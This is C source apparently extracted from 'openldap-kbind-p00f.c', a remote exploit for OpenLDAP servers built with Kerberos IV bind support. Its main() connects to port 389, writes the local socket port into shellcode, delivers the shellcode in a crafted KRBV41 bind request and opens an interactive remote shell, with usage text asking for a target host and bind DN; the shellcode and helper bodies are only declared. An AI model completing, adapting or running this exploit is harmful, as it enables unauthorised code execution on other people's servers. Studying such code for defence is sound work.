#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 size_t FINDSCKPORTOFS ; 
 int /*<<< orphan*/  LDAP_AUTH_KRBV41 ; 
 int SHELLCODE_LEN ; 
 int /*<<< orphan*/  build_shellcode (char*,int) ; 
 int /*<<< orphan*/  close (int) ; 
 int connect_host (char*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int get_local_port (int) ; 
 char* ldap_result (int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int read_bind_result (int) ; 
 int /*<<< orphan*/  send_bind_request (int,int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  sh (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int main(int argc, char* argv[])
{
	char shellcode_buf[SHELLCODE_LEN+1];
	int port, sock, res;
	char* dn;
	char* p;

	printf(": openldap-kbind-p00f.c - OpenLDAP kbind remote exploit\n");
	printf("\n");
	printf(": Only works on servers compiled with\n");
	printf("    --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]\n");
	printf("\n");
	printf(": by Solar Eclipse <solareclipse@phreedom.org>\n\n");
	
	if (argc < 3) {
		printf(": Usage: %s hostname bind_dn\n", argv[0]);
		printf("  The bind_dn must exist in the LDAP directory.\n");
		exit(1);
	}

	dn = argv[2];

	port = 389; /*atoi(argv[2]);*/
	sock = connect_host(argv[1], port);

/*
	send_bind_request(sock, LDAP_AUTH_SIMPLE, dn, "secret");
	res = read_bind_result(sock);
	printf("LDAP_AUTH_SIMPLE bind request returned %s\n", ldap_result(res));
*/

/*	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, "secret");
	res = read_bind_result(sock);
	printf("LDAP_AUTH_KRBV41 bind request returned %s\n", ldap_result(res));	
*/
	port = get_local_port(sock);

	shellcode[FINDSCKPORTOFS] = (char) (port & 0xff);
	shellcode[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);

	build_shellcode(shellcode_buf, SHELLCODE_LEN);
	shellcode_buf[SHELLCODE_LEN] = '\0';

	printf("Sending shellcode\n");
	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, shellcode_buf);
	
	sleep(2);

	/* Priming commands */
	write(sock, "echo 'a';\n", 10);

	printf("Reading bind result\n");
	res = read_bind_result(sock);
	if (res > 0)
		printf("LDAP_AUTH_KRBV41 bind request returned %s\n", ldap_result(res));
	else {
		printf("Spawning shell...\n");
		sh(sock);
	}

	close(sock);
	
	return 0;
}